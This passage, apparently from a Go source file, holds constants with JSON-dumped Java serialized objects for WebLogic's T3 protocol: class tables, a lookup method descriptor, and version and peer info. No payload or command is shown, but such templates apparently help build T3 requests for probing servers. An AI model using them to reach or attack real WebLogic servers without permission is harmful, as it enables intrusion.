                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 115,
                                      "type_verbose": "TC_OBJECT",
                                      "class_desc": {
                                        "type": 0,
                                        "type_verbose": "X_CLASSDESC",
                                        "detail": {
                                          "type": 114,
                                          "type_verbose": "TC_CLASSDESC",
                                          "is_null": false,
                                          "class_name": "java.lang.Integer",
                                          "serial_version": "EuKgpPeBhzg=",
                                          "handle": 8257570,
                                          "desc_flag": 2,
                                          "fields": {
                                            "type": 0,
                                            "type_verbose": "X_CLASSFIELDS",
                                            "field_count": 1,
                                            "fields": [
                                              {
                                                "type": 0,
                                                "type_verbose": "X_CLASSFIELD",
                                                "name": "value",
                                                "field_type": 73,
                                                "field_type_verbose": "int",
                                                "class_name_1": null
                                              }
                                            ]
                                          },
                                          "annotations": null,
                                          "super_class": {
                                            "type": 0,
                                            "type_verbose": "X_CLASSDESC",
                                            "detail": {
                                              "type": 114,
                                              "type_verbose": "TC_CLASSDESC",
                                              "is_null": false,
                                              "class_name": "java.lang.Number",
                                              "serial_version": "hqyVHQuU4Is=",
                                              "handle": 8257571,
                                              "desc_flag": 2,
                                              "fields": {
                                                "type": 0,
                                                "type_verbose": "X_CLASSFIELDS",
                                                "field_count": 0,
                                                "fields": null
                                              },
                                              "annotations": null,
                                              "super_class": {
                                                "type": 112,
                                                "type_verbose": "TC_NULL"
                                              },
                                              "dynamic_proxy_class": false,
                                              "dynamic_proxy_class_interface_count": 0,
                                              "dynamic_proxy_annotation": null,
                                              "dynamic_proxy_class_interface_names": null
                                            }
                                          },
                                          "dynamic_proxy_class": false,
                                          "dynamic_proxy_class_interface_count": 0,
                                          "dynamic_proxy_annotation": null,
                                          "dynamic_proxy_class_interface_names": null
                                        }
                                      },
                                      "class_data": [
                                        {
                                          "type": 0,
                                          "type_verbose": "X_CLASSDATA",
                                          "fields": null,
                                          "block_data": null
                                        },
                                        {
                                          "type": 0,
                                          "type_verbose": "X_CLASSDATA",
                                          "fields": null,
                                          "block_data": null
                                        },
                                        {
                                          "type": 0,
                                          "type_verbose": "X_CLASSDATA",
                                          "fields": [
                                            {
                                              "type": 0,
                                              "type_verbose": "X_FIELDVALUE",
                                              "field_type": 73,
                                              "field_type_verbose": "int",
                                              "bytes": "/////w=="
                                            }
                                          ],
                                          "block_data": null
                                        }
                                      ],
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 113,
                                      "type_verbose": "TC_REFERENCE",
                                      "value": "AH4AJA==",
                                      "handle": 8257572
                                    }
                                  }
                                ],
                                "handle": 8257569
                              }
                            }
                          ],
                          "block_data": [
                            {
                              "type": 120,
                              "type_verbose": "TC_ENDBLOCKDATA"
                            }
                          ]
                        }
                      ],
                      "handle": 8257568
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 115,
                      "type_verbose": "TC_OBJECT",
                      "class_desc": {
                        "type": 113,
                        "type_verbose": "TC_REFERENCE",
                        "value": "AH4AGg==",
                        "handle": 8257562
                      },
                      "class_data": [
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": null,
                          "block_data": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": [
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAAAA=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAACg=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 91,
                              "field_type_verbose": "array",
                              "object": {
                                "type": 117,
                                "type_verbose": "TC_ARRAY",
                                "class_desc": {
                                  "type": 113,
                                  "type_verbose": "TC_REFERENCE",
                                  "value": "AH4AHA==",
                                  "handle": 8257564
                                },
                                "size": 10,
                                "values": [
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  }
                                ],
                                "handle": 8257574
                              }
                            }
                          ],
                          "block_data": [
                            {
                              "type": 120,
                              "type_verbose": "TC_ENDBLOCKDATA"
                            }
                          ]
                        }
                      ],
                      "handle": 8257573
                    }
                  }
                ],
                "block_data": null
              }
            ],
            "handle": 8257560
          },
          {
            "type": 113,
            "type_verbose": "TC_REFERENCE",
            "value": "AH4AGA==",
            "handle": 8257560
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257538
  }
]`
const lookupObj0 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.ClassTableEntry",
        "serial_version": "L1JlgVf0+e0=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 0,
            "type_verbose": "X_CLASSDESC",
            "detail": {
              "type": 114,
              "type_verbose": "TC_CLASSDESC",
              "is_null": false,
              "class_name": "java.util.Hashtable",
              "serial_version": "E7sPJSFK5Lg=",
              "handle": 8257538,
              "desc_flag": 3,
              "fields": {
                "type": 0,
                "type_verbose": "X_CLASSFIELDS",
                "field_count": 2,
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "loadFactor",
                    "field_type": 70,
                    "field_type_verbose": "float",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "threshold",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  }
                ]
              },
              "annotations": null,
              "super_class": {
                "type": 112,
                "type_verbose": "TC_NULL"
              },
              "dynamic_proxy_class": false,
              "dynamic_proxy_class_interface_count": 0,
              "dynamic_proxy_annotation": null,
              "dynamic_proxy_class_interface_names": null
            }
          },
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 2,
            "contents": "AAA="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`
const lookupObj1 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.ImmutableServiceContext",
        "serial_version": "3cuocGOG8Lo=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 0,
          "type_verbose": "X_CLASSDESC",
          "detail": {
            "type": 114,
            "type_verbose": "TC_CLASSDESC",
            "is_null": false,
            "class_name": "t3.rmi.provider.BasicServiceContext",
            "serial_version": "5GMiNsXUpx4=",
            "handle": 8257537,
            "desc_flag": 12,
            "fields": {
              "type": 0,
              "type_verbose": "X_CLASSFIELDS",
              "field_count": 0,
              "fields": null
            },
            "annotations": null,
            "super_class": {
              "type": 112,
              "type_verbose": "TC_NULL"
            },
            "dynamic_proxy_class": false,
            "dynamic_proxy_class_interface_count": 0,
            "dynamic_proxy_annotation": null,
            "dynamic_proxy_class_interface_names": null
          }
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 2,
            "contents": "BgA="
          },
          {
            "type": 115,
            "type_verbose": "TC_OBJECT",
            "class_desc": {
              "type": 0,
              "type_verbose": "X_CLASSDESC",
              "detail": {
                "type": 114,
                "type_verbose": "TC_CLASSDESC",
                "is_null": false,
                "class_name": "t3.rmi.internal.MethodDescriptor",
                "serial_version": "Ekhagor39ns=",
                "handle": 8257539,
                "desc_flag": 12,
                "fields": {
                  "type": 0,
                  "type_verbose": "X_CLASSFIELDS",
                  "field_count": 0,
                  "fields": null
                },
                "annotations": null,
                "super_class": {
                  "type": 112,
                  "type_verbose": "TC_NULL"
                },
                "dynamic_proxy_class": false,
                "dynamic_proxy_class_interface_count": 0,
                "dynamic_proxy_annotation": null,
                "dynamic_proxy_class_interface_names": null
              }
            },
            "class_data": [
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": null,
                "block_data": null
              },
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": null,
                "block_data": [
                  {
                    "type": 119,
                    "type_verbose": "TC_BLOCKDATA",
                    "is_long": false,
                    "size": 53,
                    "contents": "AC9sb29rdXAoTGphdmEubGFuZy5TdHJpbmc7TGphdmEudXRpbC5IYXNodGFibGU7KQAAAAk="
                  },
                  {
                    "type": 120,
                    "type_verbose": "TC_ENDBLOCKDATA"
                  }
                ]
              }
            ],
            "handle": 8257540
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA",
            "is_empty": true
          }
        ]
      }
    ],
    "handle": 8257538
  }
]`
const contextObj0 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.ClassTableEntry",
        "serial_version": "L1JlgVf0+e0=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 0,
            "type_verbose": "X_CLASSDESC",
            "detail": {
              "type": 114,
              "type_verbose": "TC_CLASSDESC",
              "is_null": false,
              "class_name": "t3.common.internal.PackageInfo",
              "serial_version": "5vcj57iuHsk=",
              "handle": 8257538,
              "desc_flag": 2,
              "fields": {
                "type": 0,
                "type_verbose": "X_CLASSFIELDS",
                "field_count": 8,
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "major",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "minor",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "rollingPatch",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "servicePack",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "temporaryPatch",
                    "field_type": 90,
                    "field_type_verbose": "boolean",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "implTitle",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "class_name_1": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": 18,
                      "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                      "value": "Ljava/lang/String;",
                      "handle": 0
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "implVendor",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "class_name_1": {
                      "type": 113,
                      "type_verbose": "TC_REFERENCE",
                      "value": "AH4AAw==",
                      "handle": 8257539
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "implVersion",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "class_name_1": {
                      "type": 113,
                      "type_verbose": "TC_REFERENCE",
                      "value": "AH4AAw==",
                      "handle": 8257539
                    }
                  }
                ]
              },
              "annotations": null,
              "super_class": {
                "type": 112,
                "type_verbose": "TC_NULL"
              },
              "dynamic_proxy_class": false,
              "dynamic_proxy_class_interface_count": 0,
              "dynamic_proxy_annotation": null,
              "dynamic_proxy_class_interface_names": null
            }
          },
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 2,
            "contents": "AAA="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`

const contextObj1 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.ClassTableEntry",
        "serial_version": "L1JlgVf0+e0=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 0,
            "type_verbose": "X_CLASSDESC",
            "detail": {
              "type": 114,
              "type_verbose": "TC_CLASSDESC",
              "is_null": false,
              "class_name": "t3.common.internal.VersionInfo",
              "serial_version": "lyJFUWRSRj4=",
              "handle": 8257538,
              "desc_flag": 2,
              "fields": {
                "type": 0,
                "type_verbose": "X_CLASSFIELDS",
                "field_count": 3,
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "packages",
                    "field_type": 91,
                    "field_type_verbose": "array",
                    "class_name_1": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": 39,
                      "raw": "W0x3ZWJsb2dpYy9jb21tb24vaW50ZXJuYWwvUGFja2FnZUluZm87",
                      "value": "[Lweblogic/common/internal/PackageInfo;",
                      "handle": 0
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "releaseVersion",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "class_name_1": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": 18,
                      "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                      "value": "Ljava/lang/String;",
                      "handle": 0
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "versionInfoAsBytes",
                    "field_type": 91,
                    "field_type_verbose": "array",
                    "class_name_1": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": 2,
                      "raw": "W0I=",
                      "value": "[B",
                      "handle": 0
                    }
                  }
                ]
              },
              "annotations": null,
              "super_class": {
                "type": 0,
                "type_verbose": "X_CLASSDESC",
                "detail": {
                  "type": 114,
                  "type_verbose": "TC_CLASSDESC",
                  "is_null": false,
                  "class_name": "t3.common.internal.PackageInfo",
                  "serial_version": "5vcj57iuHsk=",
                  "handle": 8257542,
                  "desc_flag": 2,
                  "fields": {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELDS",
                    "field_count": 8,
                    "fields": [
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "major",
                        "field_type": 73,
                        "field_type_verbose": "int",
                        "class_name_1": null
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "minor",
                        "field_type": 73,
                        "field_type_verbose": "int",
                        "class_name_1": null
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "rollingPatch",
                        "field_type": 73,
                        "field_type_verbose": "int",
                        "class_name_1": null
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "servicePack",
                        "field_type": 73,
                        "field_type_verbose": "int",
                        "class_name_1": null
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "temporaryPatch",
                        "field_type": 90,
                        "field_type_verbose": "boolean",
                        "class_name_1": null
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "implTitle",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 113,
                          "type_verbose": "TC_REFERENCE",
                          "value": "AH4ABA==",
                          "handle": 8257540
                        }
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "implVendor",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 113,
                          "type_verbose": "TC_REFERENCE",
                          "value": "AH4ABA==",
                          "handle": 8257540
                        }
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "implVersion",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 113,
                          "type_verbose": "TC_REFERENCE",
                          "value": "AH4ABA==",
                          "handle": 8257540
                        }
                      }
                    ]
                  },
                  "annotations": null,
                  "super_class": {
                    "type": 112,
                    "type_verbose": "TC_NULL"
                  },
                  "dynamic_proxy_class": false,
                  "dynamic_proxy_class_interface_count": 0,
                  "dynamic_proxy_annotation": null,
                  "dynamic_proxy_class_interface_names": null
                }
              },
              "dynamic_proxy_class": false,
              "dynamic_proxy_class_interface_count": 0,
              "dynamic_proxy_annotation": null,
              "dynamic_proxy_class_interface_names": null
            }
          },
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 2,
            "contents": "AAA="
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257537
  }
]`

const contextObj2 = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "t3.rjvm.ClassTableEntry",
        "serial_version": "L1JlgVf0+e0=",
        "handle": 8257536,
        "desc_flag": 12,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 0,
          "fields": null
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": [
          {
            "type": 0,
            "type_verbose": "X_CLASSDESC",
            "detail": {
              "type": 114,
              "type_verbose": "TC_CLASSDESC",
              "is_null": false,
              "class_name": "t3.common.internal.PeerInfo",
              "serial_version": "WFR085vJCPE=",
              "handle": 8257538,
              "desc_flag": 2,
              "fields": {
                "type": 0,
                "type_verbose": "X_CLASSFIELDS",
                "field_count": 6,
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "major",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "minor",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "rollingPatch",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "servicePack",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "temporaryPatch",
                    "field_type": 90,
                    "field_type_verbose": "boolean",
                    "class_name_1": null
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELD",
                    "name": "packages",
                    "field_type": 91,
                    "field_type_verbose": "array",
                    "class_name_1": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": 39,
                      "raw": "W0x3ZWJsb2dpYy9jb21tb24vaW50ZXJuYWwvUGFja2FnZUluZm87",
                      "value": "[Lweblogic/common/internal/PackageInfo;",
                      "handle": 0
                    }
                  }
                ]
              },
              "annotations": null,
              "super_class": {
                "type": 0,
                "type_verbose": "X_CLASSDESC",
                "detail": {
                  "type": 114,
                  "type_verbose": "TC_CLASSDESC",
                  "is_null": false,
                  "class_name": "t3.common.internal.VersionInfo",
                  "serial_version": "lyJFUWRSRj4=",
                  "handle": 8257540,
                  "desc_flag": 2,
                  "fields": {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELDS",
                    "field_count": 3,
                    "fields": [
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "packages",
                        "field_type": 91,
                        "field_type_verbose": "array",
                        "class_name_1": {
                          "type": 113,
                          "type_verbose": "TC_REFERENCE",
                          "value": "AH4AAw==",
                          "handle": 8257539
                        }
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "releaseVersion",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 116,
                          "type_verbose": "TC_STRING",
                          "is_long": false,
                          "size": 18,
                          "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                          "value": "Ljava/lang/String;",
                          "handle": 0
                        }
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "versionInfoAsBytes",
                        "field_type": 91,
                        "field_type_verbose": "array",
                        "class_name_1": {
                          "type": 116,
                          "type_verbose": "TC_STRING",
                          "is_long": false,
                          "size": 2,
                          "raw": "W0I=",
                          "value": "[B",
                          "handle": 0
                        }
                      }
                    ]
                  },
                  "annotations": null,
                  "super_class": {
                    "type": 0,
                    "type_verbose": "X_CLASSDESC",
                    "detail": {
                      "type": 114,
                      "type_verbose": "TC_CLASSDESC",
                      "is_null": false,
                      "class_name": "t3.common.internal.PackageInfo",
                      "serial_version": "5vcj57iuHsk=",
                      "handle": 8257543,
                      "desc_flag": 2,
                      "fields": {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELDS",
                        "field_count": 8,
                        "fields": [
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
                            "name": "major",
                            "field_type": 73,
                            "field_type_verbose": "int",
                            "class_name_1": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELD",
